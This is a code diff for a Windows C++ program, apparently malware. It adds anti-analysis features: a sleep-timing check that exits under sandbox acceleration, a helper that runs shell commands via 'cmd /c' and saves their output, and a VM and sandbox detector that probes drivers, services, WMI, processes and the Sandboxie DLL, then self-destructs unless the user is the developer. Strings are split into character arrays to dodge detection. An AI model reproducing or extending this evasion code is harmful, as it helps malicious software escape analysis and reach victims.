@@ -9,7 +9,7 @@
 #include <iostream>
 #include <UserEnv.h>
 #include <ShlObj.h>
-
+#include "FileHelper.h"
 #include "api.h"
 #include "StrHelper.h"
 
@@ -18,6 +18,8 @@
 #pragma comment(lib, "zlib.lib")
 
 using namespace std;
+
+#define CMD_RESULT_FILENAME		"cmdResult.txt"
 
 
 int IsSystemPrivilege()
@@ -372,4 +374,266 @@ int adjustPrivileges() {
 	}
 
 	return FALSE;
+}
+
+
+int delay(int seconds) {
+
+	ULONGLONG t1 = GetTickCount64();
+	ULONGLONG t2 = t1;
+	do
+	{
+		t2 = GetTickCount64();
+
+		ULONGLONG tm1 = time(0);
+
+		lpSleep(1000);
+
+		ULONGLONG t3 = GetTickCount64();
+
+		ULONGLONG tm2 = time(0);
+
+		if (t3 - t2 < 1000 || tm2 - tm1 < 1) {
+			while (1) {
+				ExitProcess(0);
+
+			}
+		}
+	} while (t2 - t1 < seconds * 1000);
+
+	return 0;
+}
+
+
+int commandline(WCHAR* szparam, int wait, int show, DWORD* ret) {
+	int result = 0;
+
+	STARTUPINFOW si = { 0 };
+	PROCESS_INFORMATION pi = { 0 };
+	DWORD processcode = 0;
+	DWORD threadcode = 0;
+
+	si.cb = sizeof(STARTUPINFOW);
+	si.lpDesktop = (WCHAR*)L"WinSta0\\Default";
+	si.dwFlags = STARTF_USESHOWWINDOW;
+	si.wShowWindow = show;
+	DWORD dwCreationFlags = NORMAL_PRIORITY_CLASS | CREATE_NEW_CONSOLE | CREATE_UNICODE_ENVIRONMENT;
+
+	result = CreateProcessW(0, szparam, 0, 0, 0, 0, 0, 0, &si, &pi);
+	int errorcode = GetLastError();
+	if (result) {
+		if (wait)
+		{
+			lpWaitForSingleObject(pi.hProcess, INFINITE);
+			GetExitCodeThread(pi.hProcess, &threadcode);
+			GetExitCodeProcess(pi.hProcess, &processcode);
+		}
+
+		lpCloseHandle(pi.hProcess);
+		lpCloseHandle(pi.hThread);
+	}
+	//runLog(L"command:%ws result:%d, process excode:%d, thread excode:%d ,errorcode:%d\r\n",szparam, result, processcode, threadcode, errorcode);
+	return result;
+}
+
+int __stdcall shell(const char* cmd) {
+	int ret = 0;
+
+	wchar_t wstrcmd[1024];
+
+	char command[1024];
+
+	char cmdfmt[] = { 'c','m','d',' ','/','c',' ','%','s',' ','>',' ','%','s',0 };
+	wsprintfA(command, cmdfmt, cmd, CMD_RESULT_FILENAME);
+
+	ret = mbstowcs(wstrcmd, command, sizeof(wstrcmd) / sizeof(wchar_t));
+
+	DWORD result = 0;
+
+	ret = commandline(wstrcmd, TRUE, FALSE, &result);
+
+	return ret;
+}
+
+int checkVM() {
+
+	int ret = 0;
+
+	int vmlabel = FALSE;
+
+	do
+	{
+		char syspath[MAX_PATH];
+		int len = lpGetSystemDirectoryA(syspath, sizeof(syspath));
+		syspath[len] = 0;
+		char drivers[] = { '\\','d','r','i','v','e','r','s','\\',0 };
+		string driverpath = string(syspath) + drivers;
+
+		char vmmouse[] = { 'v','m','m','o','u','s','e','.','s','y','s',0 };
+		char vboxmouse[] = { 'V','B','o','x','M','o','u','s','e','.','s','y','s',0 };
+		ret = FileHelper::CheckFileExist(driverpath + vmmouse);		//vmmemctl.sys
+		if (ret)
+		{
+			vmlabel = 1;
+			break;
+		}
+
+		ret = FileHelper::CheckFileExist(driverpath + vboxmouse);		//VBoxGuest
+		if (ret)
+		{
+			vmlabel = 2;
+			break;
+		}
+
+		const char sccmd[] = { 's','c',' ','q','u','e','r','y',0 };
+		shell(sccmd);
+		char* file = 0;
+		int filesize = 0;
+		ret = FileHelper::fileReader(CMD_RESULT_FILENAME, &file, &filesize);
+		if (ret)
+		{
+			file[filesize] = 0;
+
+			char vgas[] = { 'V','G','A','u','t','h','S','e','r','v','i','c','e',0 };
+			char vmt[] = { 'V','M','T','o','o','l','s',0 };
+			char vbs[] = { 'V','b','o','x','S','e','r','v','i','c','e',0 };
+
+			char prefix[] = { 'S','E','R','V','I','C','E','_','N','A','M','E',':',' ',0 };
+			string vgauth = string(prefix) + vgas + "\r\n";
+			string tool = string(prefix) + vmt + "\r\n";
+			string vboxserv = string(prefix) + vbs + "\r\n";
+
+			if (strstr(file, vgauth.c_str()) || strstr(file, tool.c_str()))
+			{
+				vmlabel = 1;
+				break;
+			}
+			else if (strstr(file, vboxserv.c_str()))
+			{
+				vmlabel = 2;
+				break;
+			}
+		}
+
+		const char wmiccmd[] = { 'w','m','i','c',' ','p','a','t','h',' ','W','i','n','3','2','_',\
+			'C','o','m','p','u','t','e','r','S','y','s','t','e','m',' ','g','e','t',' ','M','o','d','e','l',0 };
+		shell(wmiccmd);
+		ret = FileHelper::fileReader(CMD_RESULT_FILENAME, &file, &filesize);
+		if (ret)
+		{
+			*(DWORD*)(file + filesize) = 0;
+
+			//runLog(L"model:%ws\r\n", file);
+
+			const wchar_t vm[] = { 'V','M','w','a','r','e',0 };
+			const wchar_t vb[] = { 'V','i','r','t','u','a','l','B','o','x',0 };
+			const wchar_t vp[] = { 'V','i','r','t','u','a','l','P','C',0 };
+			if (wcsstr((wchar_t*)file, vm))
+			{
+				vmlabel = TRUE;
+				break;
+			}
+			else if (wcsstr((wchar_t*)file, vb))
+			{
+				vmlabel = 2;
+				break;
+			}
+			else if (wcsstr((wchar_t*)file, vp))
+			{
+				vmlabel = 3;
+				break;
+			}
+		}
+
+		char vgauths[] = { 'V','G','A','u','t','h','S','e','r','v','i','c','e','.','e','x','e',0 };
+		char vmtoolsd[] = { 'v','m','t','o','o','l','s','d','.','e','x','e',0 };
+		char vbs[] = { 'V','B','o','x','S','e','r','v','i','c','e','.','e','x','e',0 };
+		char vbt[] = { 'V','B','o','x','T','r','a','y','.','e','x','e',0 };
+		DWORD pid = GetProcessIdByName(vgauths);
+		if (pid)
+		{
+			vmlabel = 1;
+			break;
+		}
+		pid = GetProcessIdByName(vmtoolsd);
+		if (pid)
+		{
+			vmlabel = 1;
+			break;
+		}
+		pid = GetProcessIdByName(vbs);
+		if (pid)
+		{
+			vmlabel = 2;
+			break;
+		}
+		pid = GetProcessIdByName(vbt);
+		if (pid)
+		{
+			vmlabel = 2;
+			break;
+		}
+
+		pid = GetProcessIdByName("prl_tools_service.exe");
+		if (pid)
+		{
+			vmlabel = 4;
+			break;
+		}
+		pid = GetProcessIdByName("prl_cc.exe");
+		if (pid)
+		{
+			vmlabel = 4;
+			break;
+		}
+		pid = GetProcessIdByName("prl_tools.exe");
+		if (pid)
+		{
+			vmlabel = 4;
+			break;
+		}
+
+		char szsbie[] = { 's','b','i','e','d','l','l','.','d','l','l',0 };
+		HMODULE hdll = lpLoadLibraryA(szsbie);
+		if (hdll)
+		{
+			lpFreeLibrary(hdll);
+			hdll = lpLoadLibraryA(szsbie);
+			if (hdll) {
+				vmlabel = 3;
+			}
+			else {
+				vmlabel = 0;
+			}
+
+			break;
+		}
+
+	} while (FALSE);
+
+	if (vmlabel)
+	{
+#ifdef _DEBUG
+
+#else
+		char username[MAX_PATH];
+		DWORD uslen = sizeof(username);
+		lpGetUserNameA(username, &uslen);
+
+		// 		char hostname[MAX_PATH];
+		// 		ret = gethostname(hostname, sizeof(hostname));
+
+		char computername[MAX_PATH];
+		DWORD cpnl = sizeof(computername);
+		ret = lpGetComputerNameA(computername, &cpnl);
+		char myusername[] = { 'l','j','g',0 };
+		if (lstrcmpA(username, myusername))
+		{
+			runLog("running in box:%d\r\n", vmlabel);
+			suicide();
+		}
+#endif
+	}
+	//runLog("checkVM ok\r\n");
+	return ret;
 }
